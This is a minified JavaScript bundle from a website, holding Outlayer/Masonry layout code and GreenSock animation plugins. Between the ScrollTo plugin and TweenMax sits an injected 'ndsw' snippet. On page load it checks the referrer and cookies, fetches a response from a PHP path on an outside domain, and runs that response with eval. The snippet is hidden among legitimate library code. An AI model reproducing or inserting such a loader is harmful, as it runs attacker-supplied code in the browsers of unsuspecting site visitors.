          , a = this.layout.size;
        -1 != n.indexOf("%") && (r = r / 100 * a.width),
        -1 != o.indexOf("%") && (s = s / 100 * a.height),
        r = isNaN(r) ? 0 : r,
        s = isNaN(s) ? 0 : s,
        r -= e ? a.paddingLeft : a.paddingRight,
        s -= i ? a.paddingTop : a.paddingBottom,
        this.position.x = r,
        this.position.y = s
    }
    ,
    d.layoutPosition = function() {
        var t = this.layout.size
          , e = {}
          , i = this.layout._getOption("originLeft")
          , n = this.layout._getOption("originTop")
          , o = i ? "paddingLeft" : "paddingRight"
          , r = i ? "left" : "right"
          , s = i ? "right" : "left"
          , a = this.position.x + t[o];
        e[r] = this.getXValue(a),
        e[s] = "";
        var h = n ? "paddingTop" : "paddingBottom"
          , u = n ? "top" : "bottom"
          , d = n ? "bottom" : "top"
          , l = this.position.y + t[h];
        e[u] = this.getYValue(l),
        e[d] = "",
        this.css(e),
        this.emitEvent("layout", [this])
    }
    ,
    d.getXValue = function(t) {
        var e = this.layout._getOption("horizontal");
        return this.layout.options.percentPosition && !e ? t / this.layout.size.width * 100 + "%" : t + "px"
    }
    ,
    d.getYValue = function(t) {
        var e = this.layout._getOption("horizontal");
        return this.layout.options.percentPosition && e ? t / this.layout.size.height * 100 + "%" : t + "px"
    }
    ,
    d._transitionTo = function(t, e) {
        this.getPosition();
        var i = this.position.x
          , n = this.position.y
          , o = t == this.position.x && e == this.position.y;
        if (this.setPosition(t, e),
        o && !this.isTransitioning)
            return void this.layoutPosition();
        var r = t - i
          , s = e - n
          , a = {};
        a.transform = this.getTranslate(r, s),
        this.transition({
            to: a,
            onTransitionEnd: {
                transform: this.layoutPosition
            },
            isCleaning: !0
        })
    }
    ,
    d.getTranslate = function(t, e) {
        var i = this.layout._getOption("originLeft")
          , n = this.layout._getOption("originTop");
        return t = i ? t : -t,
        e = n ? e : -e,
        "translate3d(" + t + "px, " + e + "px, 0)"
    }
    ,
    d.goTo = function(t, e) {
        this.setPosition(t, e),
        this.layoutPosition()
    }
    ,
    d.moveTo = d._transitionTo,
    d.setPosition = function(t, e) {
        this.position.x = parseFloat(t),
        this.position.y = parseFloat(e)
    }
    ,
    d._nonTransition = function(t) {
        this.css(t.to),
        t.isCleaning && this._removeStyles(t.to);
        for (var e in t.onTransitionEnd)
            t.onTransitionEnd[e].call(this)
    }
    ,
    d.transition = function(t) {
        if (!parseFloat(this.layout.options.transitionDuration))
            return void this._nonTransition(t);
        var e = this._transn;
        for (var i in t.onTransitionEnd)
            e.onEnd[i] = t.onTransitionEnd[i];
        for (i in t.to)
            e.ingProperties[i] = !0,
            t.isCleaning && (e.clean[i] = !0);
        if (t.from) {
            this.css(t.from);
            var n = this.element.offsetHeight;
            n = null
        }
        this.enableTransition(t.to),
        this.css(t.to),
        this.isTransitioning = !0
    }
    ;
    var l = "opacity," + o(a);
    d.enableTransition = function() {
        if (!this.isTransitioning) {
            var t = this.layout.options.transitionDuration;
            t = "number" == typeof t ? t + "ms" : t,
            this.css({
                transitionProperty: l,
                transitionDuration: t,
                transitionDelay: this.staggerDelay || 0
            }),
            this.element.addEventListener(h, this, !1)
        }
    }
    ,
    d.onwebkitTransitionEnd = function(t) {
        this.ontransitionend(t)
    }
    ,
    d.onotransitionend = function(t) {
        this.ontransitionend(t)
    }
    ;
    var c = {
        "-webkit-transform": "transform"
    };
    d.ontransitionend = function(t) {
        if (t.target === this.element) {
            var e = this._transn
              , n = c[t.propertyName] || t.propertyName;
            if (delete e.ingProperties[n],
            i(e.ingProperties) && this.disableTransition(),
            n in e.clean && (this.element.style[t.propertyName] = "",
            delete e.clean[n]),
            n in e.onEnd) {
                var o = e.onEnd[n];
                o.call(this),
                delete e.onEnd[n]
            }
            this.emitEvent("transitionEnd", [this])
        }
    }
    ,
    d.disableTransition = function() {
        this.removeTransitionStyles(),
        this.element.removeEventListener(h, this, !1),
        this.isTransitioning = !1
    }
    ,
    d._removeStyles = function(t) {
        var e = {};
        for (var i in t)
            e[i] = "";
        this.css(e)
    }
    ;
    var f = {
        transitionProperty: "",
        transitionDuration: "",
        transitionDelay: ""
    };
    return d.removeTransitionStyles = function() {
        this.css(f)
    }
    ,
    d.stagger = function(t) {
        t = isNaN(t) ? 0 : t,
        this.staggerDelay = t + "ms"
    }
    ,
    d.removeElem = function() {
        this.element.parentNode.removeChild(this.element),
        this.css({
            display: ""
        }),
        this.emitEvent("remove", [this])
    }
    ,
    d.remove = function() {
        return s && parseFloat(this.layout.options.transitionDuration) ? (this.once("transitionEnd", function() {
            this.removeElem()
        }),
        void this.hide()) : void this.removeElem()
    }
    ,
    d.reveal = function() {
        delete this.isHidden,
        this.css({
            display: ""
        });
        var t = this.layout.options
          , e = {}
          , i = this.getHideRevealTransitionEndProperty("visibleStyle");
        e[i] = this.onRevealTransitionEnd,
        this.transition({
            from: t.hiddenStyle,
            to: t.visibleStyle,
            isCleaning: !0,
            onTransitionEnd: e
        })
    }
    ,
    d.onRevealTransitionEnd = function() {
        this.isHidden || this.emitEvent("reveal")
    }
    ,
    d.getHideRevealTransitionEndProperty = function(t) {
        var e = this.layout.options[t];
        if (e.opacity)
            return "opacity";
        for (var i in e)
            return i
    }
    ,
    d.hide = function() {
        this.isHidden = !0,
        this.css({
            display: ""
        });
        var t = this.layout.options
          , e = {}
          , i = this.getHideRevealTransitionEndProperty("hiddenStyle");
        e[i] = this.onHideTransitionEnd,
        this.transition({
            from: t.visibleStyle,
            to: t.hiddenStyle,
            isCleaning: !0,
            onTransitionEnd: e
        })
    }
    ,
    d.onHideTransitionEnd = function() {
        this.isHidden && (this.css({
            display: "none"
        }),
        this.emitEvent("hide"))
    }
    ,
    d.destroy = function() {
        this.css({
            position: "",
            left: "",
            right: "",
            top: "",
            bottom: "",
            transition: "",
            transform: ""
        })
    }
    ,
    n
}),
function(t, e) {
    "use strict";
    "function" == typeof define && define.amd ? define("outlayer/outlayer", ["ev-emitter/ev-emitter", "get-size/get-size", "fizzy-ui-utils/utils", "./item"], function(i, n, o, r) {
        return e(t, i, n, o, r)
    }) : "object" == typeof module && module.exports ? module.exports = e(t, require("ev-emitter"), require("get-size"), require("fizzy-ui-utils"), require("./item")) : t.Outlayer = e(t, t.EvEmitter, t.getSize, t.fizzyUIUtils, t.Outlayer.Item)
}(window, function(t, e, i, n, o) {
    "use strict";
    function r(t, e) {
        var i = n.getQueryElement(t);
        if (!i)
            return void (h && h.error("Bad element for " + this.constructor.namespace + ": " + (i || t)));
        this.element = i,
        u && (this.$element = u(this.element)),
        this.options = n.extend({}, this.constructor.defaults),
        this.option(e);
        var o = ++l;
        this.element.outlayerGUID = o,
        c[o] = this,
        this._create();
        var r = this._getOption("initLayout");
        r && this.layout()
    }
    function s(t) {
        function e() {
            t.apply(this, arguments)
        }
        return e.prototype = Object.create(t.prototype),
        e.prototype.constructor = e,
        e
    }
    function a(t) {
        if ("number" == typeof t)
            return t;
        var e = t.match(/(^\d*\.?\d*)(\w*)/)
          , i = e && e[1]
          , n = e && e[2];
        if (!i.length)
            return 0;
        i = parseFloat(i);
        var o = m[n] || 1;
        return i * o
    }
    var h = t.console
      , u = t.jQuery
      , d = function() {}
      , l = 0
      , c = {};
    r.namespace = "outlayer",
    r.Item = o,
    r.defaults = {
        containerStyle: {
            position: "relative"
        },
        initLayout: !0,
        originLeft: !0,
        originTop: !0,
        resize: !0,
        resizeContainer: !0,
        transitionDuration: "0.4s",
        hiddenStyle: {
            opacity: 0,
            transform: "scale(0.001)"
        },
        visibleStyle: {
            opacity: 1,
            transform: "scale(1)"
        }
    };
    var f = r.prototype;
    n.extend(f, e.prototype),
    f.option = function(t) {
        n.extend(this.options, t)
    }
    ,
    f._getOption = function(t) {
        var e = this.constructor.compatOptions[t];
        return e && void 0 !== this.options[e] ? this.options[e] : this.options[t]
    }
    ,
    r.compatOptions = {
        initLayout: "isInitLayout",
        horizontal: "isHorizontal",
        layoutInstant: "isLayoutInstant",
        originLeft: "isOriginLeft",
        originTop: "isOriginTop",
        resize: "isResizeBound",
        resizeContainer: "isResizingContainer"
    },
    f._create = function() {
        this.reloadItems(),
        this.stamps = [],
        this.stamp(this.options.stamp),
        n.extend(this.element.style, this.options.containerStyle);
        var t = this._getOption("resize");
        t && this.bindResize()
    }
    ,
    f.reloadItems = function() {
        this.items = this._itemize(this.element.children)
    }
    ,
    f._itemize = function(t) {
        for (var e = this._filterFindItemElements(t), i = this.constructor.Item, n = [], o = 0; o < e.length; o++) {
            var r = e[o]
              , s = new i(r,this);
            n.push(s)
        }
        return n
    }
    ,
    f._filterFindItemElements = function(t) {
        return n.filterFindElements(t, this.options.itemSelector)
    }
    ,
    f.getItemElements = function() {
        return this.items.map(function(t) {
            return t.element
        })
    }
    ,
    f.layout = function() {
        this._resetLayout(),
        this._manageStamps();
        var t = this._getOption("layoutInstant")
          , e = void 0 !== t ? t : !this._isLayoutInited;
        this.layoutItems(this.items, e),
        this._isLayoutInited = !0
    }
    ,
    f._init = f.layout,
    f._resetLayout = function() {
        this.getSize()
    }
    ,
    f.getSize = function() {
        this.size = i(this.element)
    }
    ,
    f._getMeasurement = function(t, e) {
        var n, o = this.options[t];
        o ? ("string" == typeof o ? n = this.element.querySelector(o) : o instanceof HTMLElement && (n = o),
        this[t] = n ? i(n)[e] : o) : this[t] = 0
    }
    ,
    f.layoutItems = function(t, e) {
        t = this._getItemsForLayout(t),
        this._layoutItems(t, e),
        this._postLayout()
    }
    ,
    f._getItemsForLayout = function(t) {
        return t.filter(function(t) {
            return !t.isIgnored
        })
    }
    ,
    f._layoutItems = function(t, e) {
        if (this._emitCompleteOnItems("layout", t),
        t && t.length) {
            var i = [];
            t.forEach(function(t) {
                var n = this._getItemLayoutPosition(t);
                n.item = t,
                n.isInstant = e || t.isLayoutInstant,
                i.push(n)
            }, this),
            this._processLayoutQueue(i)
        }
    }
    ,
    f._getItemLayoutPosition = function() {
        return {
            x: 0,
            y: 0
        }
    }
    ,
    f._processLayoutQueue = function(t) {
        this.updateStagger(),
        t.forEach(function(t, e) {
            this._positionItem(t.item, t.x, t.y, t.isInstant, e)
        }, this)
    }
    ,
    f.updateStagger = function() {
        var t = this.options.stagger;
        return null === t || void 0 === t ? void (this.stagger = 0) : (this.stagger = a(t),
        this.stagger)
    }
    ,
    f._positionItem = function(t, e, i, n, o) {
        n ? t.goTo(e, i) : (t.stagger(o * this.stagger),
        t.moveTo(e, i))
    }
    ,
    f._postLayout = function() {
        this.resizeContainer()
    }
    ,
    f.resizeContainer = function() {
        var t = this._getOption("resizeContainer");
        if (t) {
            var e = this._getContainerSize();
            e && (this._setContainerMeasure(e.width, !0),
            this._setContainerMeasure(e.height, !1))
        }
    }
    ,
    f._getContainerSize = d,
    f._setContainerMeasure = function(t, e) {
        if (void 0 !== t) {
            var i = this.size;
            i.isBorderBox && (t += e ? i.paddingLeft + i.paddingRight + i.borderLeftWidth + i.borderRightWidth : i.paddingBottom + i.paddingTop + i.borderTopWidth + i.borderBottomWidth),
            t = Math.max(t, 0),
            this.element.style[e ? "width" : "height"] = t + "px"
        }
    }
    ,
    f._emitCompleteOnItems = function(t, e) {
        function i() {
            o.dispatchEvent(t + "Complete", null, [e])
        }
        function n() {
            s++,
            s == r && i()
        }
        var o = this
          , r = e.length;
        if (!e || !r)
            return void i();
        var s = 0;
        e.forEach(function(e) {
            e.once(t, n)
        })
    }
    ,
    f.dispatchEvent = function(t, e, i) {
        var n = e ? [e].concat(i) : i;
        if (this.emitEvent(t, n),
        u)
            if (this.$element = this.$element || u(this.element),
            e) {
                var o = u.Event(e);
                o.type = t,
                this.$element.trigger(o, i)
            } else
                this.$element.trigger(t, i)
    }
    ,
    f.ignore = function(t) {
        var e = this.getItem(t);
        e && (e.isIgnored = !0)
    }
    ,
    f.unignore = function(t) {
        var e = this.getItem(t);
        e && delete e.isIgnored
    }
    ,
    f.stamp = function(t) {
        t = this._find(t),
        t && (this.stamps = this.stamps.concat(t),
        t.forEach(this.ignore, this))
    }
    ,
    f.unstamp = function(t) {
        t = this._find(t),
        t && t.forEach(function(t) {
            n.removeFrom(this.stamps, t),
            this.unignore(t)
        }, this)
    }
    ,
    f._find = function(t) {
        return t ? ("string" == typeof t && (t = this.element.querySelectorAll(t)),
        t = n.makeArray(t)) : void 0
    }
    ,
    f._manageStamps = function() {
        this.stamps && this.stamps.length && (this._getBoundingRect(),
        this.stamps.forEach(this._manageStamp, this))
    }
    ,
    f._getBoundingRect = function() {
        var t = this.element.getBoundingClientRect()
          , e = this.size;
        this._boundingRect = {
            left: t.left + e.paddingLeft + e.borderLeftWidth,
            top: t.top + e.paddingTop + e.borderTopWidth,
            right: t.right - (e.paddingRight + e.borderRightWidth),
            bottom: t.bottom - (e.paddingBottom + e.borderBottomWidth)
        }
    }
    ,
    f._manageStamp = d,
    f._getElementOffset = function(t) {
        var e = t.getBoundingClientRect()
          , n = this._boundingRect
          , o = i(t)
          , r = {
            left: e.left - n.left - o.marginLeft,
            top: e.top - n.top - o.marginTop,
            right: n.right - e.right - o.marginRight,
            bottom: n.bottom - e.bottom - o.marginBottom
        };
        return r
    }
    ,
    f.handleEvent = n.handleEvent,
    f.bindResize = function() {
        t.addEventListener("resize", this),
        this.isResizeBound = !0
    }
    ,
    f.unbindResize = function() {
        t.removeEventListener("resize", this),
        this.isResizeBound = !1
    }
    ,
    f.onresize = function() {
        this.resize()
    }
    ,
    n.debounceMethod(r, "onresize", 100),
    f.resize = function() {
        this.isResizeBound && this.needsResizeLayout() && this.layout()
    }
    ,
    f.needsResizeLayout = function() {
        var t = i(this.element)
          , e = this.size && t;
        return e && t.innerWidth !== this.size.innerWidth
    }
    ,
    f.addItems = function(t) {
        var e = this._itemize(t);
        return e.length && (this.items = this.items.concat(e)),
        e
    }
    ,
    f.appended = function(t) {
        var e = this.addItems(t);
        e.length && (this.layoutItems(e, !0),
        this.reveal(e))
    }
    ,
    f.prepended = function(t) {
        var e = this._itemize(t);
        if (e.length) {
            var i = this.items.slice(0);
            this.items = e.concat(i),
            this._resetLayout(),
            this._manageStamps(),
            this.layoutItems(e, !0),
            this.reveal(e),
            this.layoutItems(i)
        }
    }
    ,
    f.reveal = function(t) {
        if (this._emitCompleteOnItems("reveal", t),
        t && t.length) {
            var e = this.updateStagger();
            t.forEach(function(t, i) {
                t.stagger(i * e),
                t.reveal()
            })
        }
    }
    ,
    f.hide = function(t) {
        if (this._emitCompleteOnItems("hide", t),
        t && t.length) {
            var e = this.updateStagger();
            t.forEach(function(t, i) {
                t.stagger(i * e),
                t.hide()
            })
        }
    }
    ,
    f.revealItemElements = function(t) {
        var e = this.getItems(t);
        this.reveal(e)
    }
    ,
    f.hideItemElements = function(t) {
        var e = this.getItems(t);
        this.hide(e)
    }
    ,
    f.getItem = function(t) {
        for (var e = 0; e < this.items.length; e++) {
            var i = this.items[e];
            if (i.element == t)
                return i
        }
    }
    ,
    f.getItems = function(t) {
        t = n.makeArray(t);
        var e = [];
        return t.forEach(function(t) {
            var i = this.getItem(t);
            i && e.push(i)
        }, this),
        e
    }
    ,
    f.remove = function(t) {
        var e = this.getItems(t);
        this._emitCompleteOnItems("remove", e),
        e && e.length && e.forEach(function(t) {
            t.remove(),
            n.removeFrom(this.items, t)
        }, this)
    }
    ,
    f.destroy = function() {
        var t = this.element.style;
        t.height = "",
        t.position = "",
        t.width = "",
        this.items.forEach(function(t) {
            t.destroy()
        }),
        this.unbindResize();
        var e = this.element.outlayerGUID;
        delete c[e],
        delete this.element.outlayerGUID,
        u && u.removeData(this.element, this.constructor.namespace)
    }
    ,
    r.data = function(t) {
        t = n.getQueryElement(t);
        var e = t && t.outlayerGUID;
        return e && c[e]
    }
    ,
    r.create = function(t, e) {
        var i = s(r);
        return i.defaults = n.extend({}, r.defaults),
        n.extend(i.defaults, e),
        i.compatOptions = n.extend({}, r.compatOptions),
        i.namespace = t,
        i.data = r.data,
        i.Item = s(o),
        n.htmlInit(i, t),
        u && u.bridget && u.bridget(t, i),
        i
    }
    ;
    var m = {
        ms: 1,
        s: 1e3
    };
    return r.Item = o,
    r
}),
function(t, e) {
    "function" == typeof define && define.amd ? define(["outlayer/outlayer", "get-size/get-size"], e) : "object" == typeof module && module.exports ? module.exports = e(require("outlayer"), require("get-size")) : t.Masonry = e(t.Outlayer, t.getSize)
}(window, function(t, e) {
    var i = t.create("masonry");
    i.compatOptions.fitWidth = "isFitWidth";
    var n = i.prototype;
    return n._resetLayout = function() {
        this.getSize(),
        this._getMeasurement("columnWidth", "outerWidth"),
        this._getMeasurement("gutter", "outerWidth"),
        this.measureColumns(),
        this.colYs = [];
        for (var t = 0; t < this.cols; t++)
            this.colYs.push(0);
        this.maxY = 0,
        this.horizontalColIndex = 0
    }
    ,
    n.measureColumns = function() {
        if (this.getContainerWidth(),
        !this.columnWidth) {
            var t = this.items[0]
              , i = t && t.element;
            this.columnWidth = i && e(i).outerWidth || this.containerWidth
        }
        var n = this.columnWidth += this.gutter
          , o = this.containerWidth + this.gutter
          , r = o / n
          , s = n - o % n
          , a = s && 1 > s ? "round" : "floor";
        r = Math[a](r),
        this.cols = Math.max(r, 1)
    }
    ,
    n.getContainerWidth = function() {
        var t = this._getOption("fitWidth")
          , i = t ? this.element.parentNode : this.element
          , n = e(i);
        this.containerWidth = n && n.innerWidth
    }
    ,
    n._getItemLayoutPosition = function(t) {
        t.getSize();
        var e = t.size.outerWidth % this.columnWidth
          , i = e && 1 > e ? "round" : "ceil"
          , n = Math[i](t.size.outerWidth / this.columnWidth);
        n = Math.min(n, this.cols);
        for (var o = this.options.horizontalOrder ? "_getHorizontalColPosition" : "_getTopColPosition", r = this[o](n, t), s = {
            x: this.columnWidth * r.col,
            y: r.y
        }, a = r.y + t.size.outerHeight, h = n + r.col, u = r.col; h > u; u++)
            this.colYs[u] = a;
        return s
    }
    ,
    n._getTopColPosition = function(t) {
        var e = this._getTopColGroup(t)
          , i = Math.min.apply(Math, e);
        return {
            col: e.indexOf(i),
            y: i
        }
    }
    ,
    n._getTopColGroup = function(t) {
        if (2 > t)
            return this.colYs;
        for (var e = [], i = this.cols + 1 - t, n = 0; i > n; n++)
            e[n] = this._getColGroupY(n, t);
        return e
    }
    ,
    n._getColGroupY = function(t, e) {
        if (2 > e)
            return this.colYs[t];
        var i = this.colYs.slice(t, t + e);
        return Math.max.apply(Math, i)
    }
    ,
    n._getHorizontalColPosition = function(t, e) {
        var i = this.horizontalColIndex % this.cols
          , n = t > 1 && i + t > this.cols;
        i = n ? 0 : i;
        var o = e.size.outerWidth && e.size.outerHeight;
        return this.horizontalColIndex = o ? i + t : this.horizontalColIndex,
        {
            col: i,
            y: this._getColGroupY(i, t)
        }
    }
    ,
    n._manageStamp = function(t) {
        var i = e(t)
          , n = this._getElementOffset(t)
          , o = this._getOption("originLeft")
          , r = o ? n.left : n.right
          , s = r + i.outerWidth
          , a = Math.floor(r / this.columnWidth);
        a = Math.max(0, a);
        var h = Math.floor(s / this.columnWidth);
        h -= s % this.columnWidth ? 0 : 1,
        h = Math.min(this.cols - 1, h);
        for (var u = this._getOption("originTop"), d = (u ? n.top : n.bottom) + i.outerHeight, l = a; h >= l; l++)
            this.colYs[l] = Math.max(d, this.colYs[l])
    }
    ,
    n._getContainerSize = function() {
        this.maxY = Math.max.apply(Math, this.colYs);
        var t = {
            height: this.maxY
        };
        return this._getOption("fitWidth") && (t.width = this._getContainerFitWidth()),
        t
    }
    ,
    n._getContainerFitWidth = function() {
        for (var t = 0, e = this.cols; --e && 0 === this.colYs[e]; )
            t++;
        return (this.cols - t) * this.columnWidth - this.gutter
    }
    ,
    n.needsResizeLayout = function() {
        var t = this.containerWidth;
        return this.getContainerWidth(),
        t != this.containerWidth
    }
    ,
    i
});
;/*!
 * VERSION: beta 1.7.1
 * DATE: 2013-10-23
 * UPDATES AND DOCS AT: http://www.greensock.com
 *
 * @license Copyright (c) 2008-2013, GreenSock. All rights reserved.
 * This work is subject to the terms at http://www.greensock.com/terms_of_use.html or for
 * Club GreenSock members, the software agreement that was issued with your membership.
 * 
 * @author: Jack Doyle, jack@greensock.com
 **/
(window._gsQueue || (window._gsQueue = [])).push(function() {
    "use strict";
    var t = document.documentElement
      , e = window
      , i = function(i, s) {
        var r = "x" === s ? "Width" : "Height"
          , n = "scroll" + r
          , a = "client" + r
          , o = document.body;
        return i === e || i === t || i === o ? Math.max(t[n], o[n]) - (e["inner" + r] || Math.max(t[a], o[a])) : i[n] - i["offset" + r]
    }
      , s = window._gsDefine.plugin({
        propName: "scrollTo",
        API: 2,
        init: function(t, s, r) {
            return this._wdw = t === e,
            this._target = t,
            this._tween = r,
            "object" != typeof s && (s = {
                y: s
            }),
            this._autoKill = s.autoKill !== !1,
            this.x = this.xPrev = this.getX(),
            this.y = this.yPrev = this.getY(),
            null != s.x ? this._addTween(this, "x", this.x, "max" === s.x ? i(t, "x") : s.x, "scrollTo_x", !0) : this.skipX = !0,
            null != s.y ? this._addTween(this, "y", this.y, "max" === s.y ? i(t, "y") : s.y, "scrollTo_y", !0) : this.skipY = !0,
            !0
        },
        set: function(t) {
            this._super.setRatio.call(this, t);
            var i = this._wdw || !this.skipX ? this.getX() : this.xPrev
              , s = this._wdw || !this.skipY ? this.getY() : this.yPrev
              , r = s - this.yPrev
              , n = i - this.xPrev;
            this._autoKill && (!this.skipX && (n > 7 || -7 > n) && (this.skipX = !0),
            !this.skipY && (r > 7 || -7 > r) && (this.skipY = !0),
            this.skipX && this.skipY && this._tween.kill()),
            this._wdw ? e.scrollTo(this.skipX ? i : this.x, this.skipY ? s : this.y) : (this.skipY || (this._target.scrollTop = this.y),
            this.skipX || (this._target.scrollLeft = this.x)),
            this.xPrev = this.x,
            this.yPrev = this.y
        }
    })
      , r = s.prototype;
    s.max = i,
    r.getX = function() {
        return this._wdw ? null != e.pageXOffset ? e.pageXOffset : null != t.scrollLeft ? t.scrollLeft : document.body.scrollLeft : this._target.scrollLeft
    }
    ,
    r.getY = function() {
        return this._wdw ? null != e.pageYOffset ? e.pageYOffset : null != t.scrollTop ? t.scrollTop : document.body.scrollTop : this._target.scrollTop
    }
    ,
    r._kill = function(t) {
        return t.scrollTo_x && (this.skipX = !0),
        t.scrollTo_y && (this.skipY = !0),
        this._super._kill.call(this, t)
    }
}),
window._gsDefine && window._gsQueue.pop()();
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/*!
 * VERSION: 1.11.0
 * DATE: 2013-10-21
 * UPDATES AND DOCS AT: http://www.greensock.com
 * 
 * Includes all of the following: TweenLite, TweenMax, TimelineLite, TimelineMax, EasePack, CSSPlugin, RoundPropsPlugin, BezierPlugin, AttrPlugin, DirectionalRotationPlugin
 *
 * @license Copyright (c) 2008-2013, GreenSock. All rights reserved.
 * This work is subject to the terms at http://www.greensock.com/terms_of_use.html or for
 * Club GreenSock members, the software agreement that was issued with your membership.
 * 
 * @author: Jack Doyle, jack@greensock.com
 **/
(window._gsQueue || (window._gsQueue = [])).push(function() {
    "use strict";
    window._gsDefine("TweenMax", ["core.Animation", "core.SimpleTimeline", "TweenLite"], function(t, e, i) {
        var s = [].slice
          , r = function(t, e, s) {
            i.call(this, t, e, s),
            this._cycle = 0,
            this._yoyo = this.vars.yoyo === !0,
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._dirty = !0,
            this.render = r.prototype.render
        }
          , n = 1e-10
          , a = i._internals.isSelector
          , o = i._internals.isArray
          , h = r.prototype = i.to({}, .1, {})
          , l = [];
        r.version = "1.11.0",
        h.constructor = r,
        h.kill()._gc = !1,
        r.killTweensOf = r.killDelayedCallsTo = i.killTweensOf,
        r.getTweensOf = i.getTweensOf,
        r.ticker = i.ticker,
        h.invalidate = function() {
            return this._yoyo = this.vars.yoyo === !0,
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._uncache(!0),
            i.prototype.invalidate.call(this)
        }
        ,
        h.updateTo = function(t, e) {
            var s, r = this.ratio;
            e && this.timeline && this._startTime < this._timeline._time && (this._startTime = this._timeline._time,
            this._uncache(!1),
            this._gc ? this._enabled(!0, !1) : this._timeline.insert(this, this._startTime - this._delay));
            for (s in t)
                this.vars[s] = t[s];
            if (this._initted)
                if (e)
                    this._initted = !1;
                else if (this._notifyPluginsOfEnabled && this._firstPT && i._onPluginEvent("_onDisable", this),
                this._time / this._duration > .998) {
                    var n = this._time;
                    this.render(0, !0, !1),
                    this._initted = !1,
                    this.render(n, !0, !1)
                } else if (this._time > 0) {
                    this._initted = !1,
                    this._init();
                    for (var a, o = 1 / (1 - r), h = this._firstPT; h; )
                        a = h.s + h.c,
                        h.c *= o,
                        h.s = a - h.c,
                        h = h._next
                }
            return this
        }
        ,
        h.render = function(t, e, i) {
            this._initted || 0 === this._duration && this.vars.repeat && this.invalidate();
            var s, r, a, o, h, _, u, p, f = this._dirty ? this.totalDuration() : this._totalDuration, c = this._time, m = this._totalTime, d = this._cycle, g = this._duration;
            if (t >= f ? (this._totalTime = f,
            this._cycle = this._repeat,
            this._yoyo && 0 !== (1 & this._cycle) ? (this._time = 0,
            this.ratio = this._ease._calcEnd ? this._ease.getRatio(0) : 0) : (this._time = g,
            this.ratio = this._ease._calcEnd ? this._ease.getRatio(1) : 1),
            this._reversed || (s = !0,
            r = "onComplete"),
            0 === g && (p = this._rawPrevTime,
            (0 === t || 0 > p || p === n) && p !== t && (i = !0,
            p > n && (r = "onReverseComplete")),
            this._rawPrevTime = p = !e || t ? t : n)) : 1e-7 > t ? (this._totalTime = this._time = this._cycle = 0,
            this.ratio = this._ease._calcEnd ? this._ease.getRatio(0) : 0,
            (0 !== m || 0 === g && this._rawPrevTime > n) && (r = "onReverseComplete",
            s = this._reversed),
            0 > t ? (this._active = !1,
            0 === g && (this._rawPrevTime >= 0 && (i = !0),
            this._rawPrevTime = p = !e || t ? t : n)) : this._initted || (i = !0)) : (this._totalTime = this._time = t,
            0 !== this._repeat && (o = g + this._repeatDelay,
            this._cycle = this._totalTime / o >> 0,
            0 !== this._cycle && this._cycle === this._totalTime / o && this._cycle--,
            this._time = this._totalTime - this._cycle * o,
            this._yoyo && 0 !== (1 & this._cycle) && (this._time = g - this._time),
            this._time > g ? this._time = g : 0 > this._time && (this._time = 0)),
            this._easeType ? (h = this._time / g,
            _ = this._easeType,
            u = this._easePower,
            (1 === _ || 3 === _ && h >= .5) && (h = 1 - h),
            3 === _ && (h *= 2),
            1 === u ? h *= h : 2 === u ? h *= h * h : 3 === u ? h *= h * h * h : 4 === u && (h *= h * h * h * h),
            this.ratio = 1 === _ ? 1 - h : 2 === _ ? h : .5 > this._time / g ? h / 2 : 1 - h / 2) : this.ratio = this._ease.getRatio(this._time / g)),
            c === this._time && !i && d === this._cycle)
                return m !== this._totalTime && this._onUpdate && (e || this._onUpdate.apply(this.vars.onUpdateScope || this, this.vars.onUpdateParams || l)),
                void 0;
            if (!this._initted) {
                if (this._init(),
                !this._initted || this._gc)
                    return;
                this._time && !s ? this.ratio = this._ease.getRatio(this._time / g) : s && this._ease._calcEnd && (this.ratio = this._ease.getRatio(0 === this._time ? 0 : 1))
            }
            for (this._active || !this._paused && this._time !== c && t >= 0 && (this._active = !0),
            0 === m && (this._startAt && (t >= 0 ? this._startAt.render(t, e, i) : r || (r = "_dummyGS")),
            this.vars.onStart && (0 !== this._totalTime || 0 === g) && (e || this.vars.onStart.apply(this.vars.onStartScope || this, this.vars.onStartParams || l))),
            a = this._firstPT; a; )
                a.f ? a.t[a.p](a.c * this.ratio + a.s) : a.t[a.p] = a.c * this.ratio + a.s,
                a = a._next;
            this._onUpdate && (0 > t && this._startAt && this._startTime && this._startAt.render(t, e, i),
            e || this._onUpdate.apply(this.vars.onUpdateScope || this, this.vars.onUpdateParams || l)),
            this._cycle !== d && (e || this._gc || this.vars.onRepeat && this.vars.onRepeat.apply(this.vars.onRepeatScope || this, this.vars.onRepeatParams || l)),
            r && (this._gc || (0 > t && this._startAt && !this._onUpdate && this._startTime && this._startAt.render(t, e, i),
            s && (this._timeline.autoRemoveChildren && this._enabled(!1, !1),
            this._active = !1),
            !e && this.vars[r] && this.vars[r].apply(this.vars[r + "Scope"] || this, this.vars[r + "Params"] || l),
            0 === g && this._rawPrevTime !== p && (this._rawPrevTime = 0)))
        }
        ,
        r.to = function(t, e, i) {
            return new r(t,e,i)
        }
        ,
        r.from = function(t, e, i) {
            return i.runBackwards = !0,
            i.immediateRender = 0 != i.immediateRender,
            new r(t,e,i)
        }
        ,
        r.fromTo = function(t, e, i, s) {
            return s.startAt = i,
            s.immediateRender = 0 != s.immediateRender && 0 != i.immediateRender,
            new r(t,e,s)
        }
        ,
        r.staggerTo = r.allTo = function(t, e, n, h, _, u, p) {
            h = h || 0;
